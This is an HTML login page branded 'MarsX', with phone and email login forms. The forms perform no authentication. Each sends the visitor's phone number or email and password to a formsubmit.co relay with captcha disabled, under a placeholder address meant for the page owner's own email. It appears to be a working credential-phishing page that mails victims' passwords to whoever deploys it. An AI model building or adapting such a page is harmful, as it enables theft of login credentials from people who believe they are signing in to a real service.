<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0c0c0c;
      font-family: Arial, sans-serif;
      color: white;
    }

    .container {
      max-width: 400px;
      margin: 100px auto 0;
      padding: 20px;
    }

    .logo {
      width: 120px;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 30px;
    }

    .toggle-buttons {
      display: flex;
      background-color: #2c2c2c;
      border-radius: 30px;
      overflow: hidden;
      width: 100%;
      margin-bottom: 30px;
    }

    .toggle-buttons button {
      flex: 1;
      padding: 10px 0;
      border: none;
      cursor: pointer;
      background-color: transparent;
      color: #ccc;
      font-weight: bold;
      font-size: 14px;
      transition: background-color 0.3s, color 0.3s;
    }

    .toggle-buttons .active {
      background-color: #c9a72e;
      color: black;
    }

    form {
      display: none;
      flex-direction: column;
    }

    form.active {
      display: flex;
    }

    label {
      margin-bottom: 5px;
      font-size: 14px;
      color: #ccc;
    }

    input {
      padding: 10px;
      margin-bottom: 20px;
      border-radius: 6px;
      border: none;
      width: 100%;
      background-color: #1c1c1c;
      color: white;
    }

    .password-wrapper {
      position: relative;
    }

    .password-wrapper input {
      padding-right: 40px;
    }

    .password-wrapper .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: gray;
    }

    .options {
      display: flex;
      flex-direction: column;
      font-size: 13px;
      margin-top: -10px;
      margin-bottom: 20px;
    }

    .options a {
      color: white;
      text-decoration: none;
      margin-bottom: 5px;
    }

    button.submit-btn {
      background-color: #c9a72e;
      color: black;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button.submit-btn:hover {
      background-color: #e6bf3c;
    }

  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.oaiusercontent.com/file-F7aXNkRsdtSiuj8zciN3bu?se=2025-08-08T00%3A00%3A00Z&sp=r&sv=2021-08-06&sr=b&sig=VqV1zF%2FvCQOa6wlfDw%2FJ5r7QyD0rK4LfnsKm8pyij90%3D" alt="MarsX Logo" class="logo" />

    <h1>Welcome To Login</h1>

    <div class="toggle-buttons">
      <button class="active" onclick="toggleForm('phone')">Phone Login</button>
      <button onclick="toggleForm('email')">Email Login</button>
    </div>

    <!-- Phone Login Form -->
    <form id="phoneForm" class="active" action="https://formsubmit.co/TON_EMAIL_ICI" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <label for="phone">Phone Number</label>
      <input type="tel" name="phone" id="phone" required />

      <label for="phonePassword">Password</label>
      <div class="password-wrapper">
        <input type="password" name="phonePassword" id="phonePassword" required />
        <span class="toggle-password" onclick="togglePassword('phonePassword')">&#128065;</span>
      </div>

      <div class="options">
        <a href="#">Forgot password?</a>
        <label><input type="checkbox" name="rememberPhone" /> Remember account and password</label>
      </div>

      <button class="submit-btn" type="submit">Login</button>
    </form>

    <!-- Email Login Form -->
    <form id="emailForm" action="https://formsubmit.co/TON_EMAIL_ICI" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <label for="email">Email</label>
      <input type="email" name="email" id="email" required />

      <label for="emailPassword">Password</label>
      <div class="password-wrapper">
        <input type="password" name="emailPassword" id="emailPassword" required />
        <span class="toggle-password" onclick="togglePassword('emailPassword')">&#128065;</span>
      </div>

      <div class="options">
        <a href="#">Forgot password?</a>
        <label><input type="checkbox" name="rememberEmail" /> Remember account and password</label>
      </div>

      <button class="submit-btn" type="submit">Login</button>
    </form>
  </div>

  <script>
    function toggleForm(type) {
      const phoneBtn = document.querySelector('.toggle-buttons button:nth-child(1)');
      const emailBtn = document.querySelector('.toggle-buttons button:nth-child(2)');
      const phoneForm = document.getElementById('phoneForm');
      const emailForm = document.getElementById('emailForm');

      if (type === 'phone') {
        phoneBtn.classList.add('active');
        emailBtn.classList.remove('active');
        phoneForm.classList.add('active');
        emailForm.classList.remove('active');
      } else {
        phoneBtn.classList.remove('active');
        emailBtn.classList.add('active');
        phoneForm.classList.remove('active');
        emailForm.classList.add('active');
      }
    }

    function togglePassword(id) {
      const input = document.getElementById(id);
      input.type = input.type === 'password' ? 'text' : 'password';
    }
  </script>
</body>
</html>
